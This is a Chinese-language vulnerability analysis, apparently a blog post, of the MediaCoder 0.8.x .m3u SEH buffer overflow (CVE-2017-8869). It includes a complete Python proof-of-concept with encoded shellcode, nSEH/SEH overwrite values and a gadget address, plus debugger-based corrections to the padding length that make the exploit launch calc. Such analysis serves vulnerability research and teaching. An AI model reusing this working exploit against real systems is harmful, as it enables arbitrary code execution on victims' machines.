影音转码快车 MediaCoder
是一个免费的通用音频/视频批量转码工具，它将众多来自开源社区的优秀音频视频编解码器和工具整合为一个通用的解决方案，它可以将音频、视频文件在各种格式之间进行转换。  
本文是针对Mediacoder缓冲区溢出漏洞的简要分析文章

### 背景概述

MediaCoder 0.8.48.5888存在缓冲区溢出漏洞，远程攻击者可通过特制的.m3u文件执行任意代码。漏洞分析过程实验环境为：

Windows xp sp3

Windbg

IDA pro

OD

MEDIACODER 软件下载：https://www.exploit-db.com/apps/bab45ceeba55cbe48a49ead4e6787fd0-MediaCoder-0.8.45.5852.exe

### 分析过程

原文提供的poc如下所示

    
    
    #!/usr/bin/python
     
    total_buf = 5000
     
     
    shellcode = ("\x89\xe1\xda\xcc\xd9\x71\xf4\x5e\x56\x59\x49\x49\x49\x49\x43"
    "\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34"
    "\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41"
    "\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
    "\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d\x38\x4c\x42\x55\x50"
    "\x45\x50\x35\x50\x53\x50\x4c\x49\x4b\x55\x46\x51\x59\x50\x55"
    "\x34\x4c\x4b\x30\x50\x56\x50\x4c\x4b\x31\x42\x54\x4c\x4c\x4b"
    "\x46\x32\x44\x54\x4c\x4b\x32\x52\x47\x58\x34\x4f\x58\x37\x50"
    "\x4a\x47\x56\x50\x31\x4b\x4f\x4e\x4c\x37\x4c\x43\x51\x53\x4c"
    "\x53\x32\x36\x4c\x51\x30\x59\x51\x58\x4f\x34\x4d\x35\x51\x48"
    "\x47\x4a\x42\x5a\x52\x36\x32\x46\x37\x4c\x4b\x56\x32\x52\x30"
    "\x4c\x4b\x50\x4a\x57\x4c\x4c\x4b\x50\x4c\x52\x31\x32\x58\x4d"
    "\x33\x30\x48\x33\x31\x38\x51\x46\x31\x4c\x4b\x50\x59\x31\x30"
    "\x33\x31\x49\x43\x4c\x4b\x30\x49\x55\x48\x5a\x43\x36\x5a\x47"
    "\x39\x4c\x4b\x30\x34\x4c\x4b\x45\x51\x39\x46\x36\x51\x4b\x4f"
    "\x4e\x4c\x59\x51\x48\x4f\x44\x4d\x53\x31\x58\x47\x56\x58\x4d"
    "\x30\x33\x45\x4b\x46\x54\x43\x43\x4d\x4c\x38\x47\x4b\x53\x4d"
    "\x37\x54\x54\x35\x5a\x44\x51\x48\x4c\x4b\x30\x58\x57\x54\x35"
    "\x51\x4e\x33\x55\x36\x4c\x4b\x54\x4c\x30\x4b\x4c\x4b\x56\x38"
    "\x45\x4c\x43\x31\x58\x53\x4c\x4b\x55\x54\x4c\x4b\x35\x51\x48"
    "\x50\x4b\x39\x51\x54\x56\x44\x46\x44\x51\x4b\x31\x4b\x43\x51"
    "\x46\x39\x30\x5a\x46\x31\x4b\x4f\x4d\x30\x51\x4f\x51\x4f\x31"
    "\x4a\x4c\x4b\x52\x32\x4a\x4b\x4c\x4d\x51\x4d\x52\x4a\x43\x31"
    "\x4c\x4d\x4c\x45\x4f\x42\x43\x30\x55\x50\x33\x30\x30\x50\x33"
    "\x58\x56\x51\x4c\x4b\x32\x4f\x4d\x57\x4b\x4f\x48\x55\x4f\x4b"
    "\x4a\x50\x38\x35\x4e\x42\x31\x46\x53\x58\x49\x36\x5a\x35\x4f"
    "\x4d\x4d\x4d\x4b\x4f\x4e\x35\x47\x4c\x43\x36\x33\x4c\x35\x5a"
    "\x4b\x30\x4b\x4b\x4d\x30\x44\x35\x33\x35\x4f\x4b\x31\x57\x44"
    "\x53\x52\x52\x52\x4f\x33\x5a\x33\x30\x36\x33\x4b\x4f\x58\x55"
    "\x42\x43\x45\x31\x52\x4c\x35\x33\x56\x4e\x55\x35\x54\x38\x32"
    "\x45\x53\x30\x41\x41")
     
    junk = "http:// "
    junk += "A"*784
    nseh = "\xEB\x06\x90\x90"
    seh = "\x38\x78\x01\x66" # PPR - 0x66017838 - libiconv-2.dll
    evil = junk + nseh + seh
    evil += "\x90"*50 + shellcode
    evil += "\x90"*3000
     
    file = open("evil.m3u", "wb")
    file.write (evil)
    file.close()
    

双击后生成一个m3u文件，用`MediaCoder`打开，触发崩溃。

使用Windbg附加程序，发现拖入文件后断在了004306b5位置

![image.png](https://image.3001.net/images/20230705/1688528508_64a4e67c3238230ee4807.png!small)

再次执行出现414141，看来到了被覆盖的跳转位置，这个poc里位置需要再调一下

![image.png](https://image.3001.net/images/20230705/1688528554_64a4e6aa09bf9b395bfb5.png!small)

参考教程中通过windbg的kb命令，回溯栈信息，还能看到入手点的上层调用函数，如下图。

![image.png](https://image.3001.net/images/20230705/1688528578_64a4e6c2c73edbed88281.png!small)

但是我在分析时，kb命令获取的信息却不太一样，应该是利用脚本需要根据利用环境进行调整的原因。

![image.png](https://image.3001.net/images/20230705/1688528600_64a4e6d837f9c33cec621.png!small)

看来没办法像原博一样，还是从第一次报错的004306b5位置开始查找原因吧

放在IDA里看一下这一部分，好像是一个死循环啊

    
    
    .text:004306B0 loc_4306B0:                             ; CODE XREF: sub_430620+9Bj
    .text:004306B0                 mov     al, [ecx]
    .text:004306B2                 lea     ecx, [ecx+1]
    .text:004306B5                 mov     [edx+ecx-1], al
    .text:004306B9                 test    al, al
    .text:004306BB                 jnz     short loc_4306B0
    

![image.png](https://image.3001.net/images/20230705/1688528646_64a4e706183385bde6b2c.png!small)

我们可以看出来这一部分函数a3作为畸形字符串传入，在里面将a3交给v5，随后v5在do
while循环中进行连续赋值，读取赋值的终止条件是取到的值为0，并没有对长度进行限制,那也就是说只要文档里有字符就会一一读出来，很明显存在安全漏洞。

![image.png](https://image.3001.net/images/20230705/1688528665_64a4e719859252af79d34.png!small)

我们在OllyDbg里进行进一步的动态调试，可知读取的内容位置起始为12f380

![image.png](https://image.3001.net/images/20230705/1688528711_64a4e7475288705a59481.png!small)

最终报错是因为构造的文件内容太长，把这段堆栈给完全填满了，mov指令在填充下一个时访问到了不可访问的位置（130000），最终报错。

![image.png](https://image.3001.net/images/20230705/1688528728_64a4e7585ea8ec19c29ba.png!small)

![image.png](https://image.3001.net/images/20230705/1688528753_64a4e7714a8bf3535e5c8.png!small)

总结来说就是由于对于文件的长度没有进行有效控制，从而导致后续函数处理调用畸形字符串时导致程序指针引用异常访问到了不可访问的位置，进入SEH处理，从而引发任意代码执行。

### 漏洞利用

原博中的exp没能成功利用而是直接崩溃，应该是位置没算好导致的，利用OD查看该程序SEH分布，离最近的应该是12f688，但是看原来生成的文件在堆栈里的分布正好错了一行，这是导致没有利用成功的主要原因

![image.png](https://image.3001.net/images/20230705/1688528789_64a4e7955273bef321e5b.png!small)

首尾减一下应该是768个A，再生成一边看看堆栈的分布，就正好对上了

![image.png](https://image.3001.net/images/20230705/1688528807_64a4e7a7532f07f83601e.png!small)

再看SEH的跳转地址也变对了，指向下一个SEH记录的指针（简称nseh），指示下一个seh结构的位置，此处使用`“ \ xeb \ x06 \ x90 \
x90”`填充，这四字节反汇编的结果是`jmp 6，nop，nop`三条指令，`jmp
6`表示跳过6个字节，刚好跳过两个nop指令和一个4字节的seh处理程序地址，然后落入nop指令区，滑行进入shellcode。

![image.png](https://image.3001.net/images/20230705/1688528827_64a4e7bb1d9750706eca7.png!small)

整个利用过程就如下图所示

![image.png](https://image.3001.net/images/20230705/1688528869_64a4e7e5481d1ff49969d.png!small)

此时把文件拖入程序尝试一下，发现成功蹦出了计算器

![image.png](https://image.3001.net/images/20230705/1688528884_64a4e7f4a9640246fc388.png!small)

以上即为MEDIACODER .M3U缓冲区溢出漏洞（CVE-2017-8869）的全部分析过程。

### 文章参考

漏洞分析——MEDIACODER 0.8.43.5852 - .M3U缓冲区溢出漏洞
<https://ayesawyer.github.io/2019/07/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94MEDIACODER-0-8-43-5852-M3U%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/>

MEDIACODER 0.8.43.5852 - .M3U缓冲区溢出漏洞

https://whereisk0shl.top/post/2018-06-23

Mediacoder 0.8.43.5852-'.m3u'（SEH）

https://www.exploit-db.com/exploits/40148

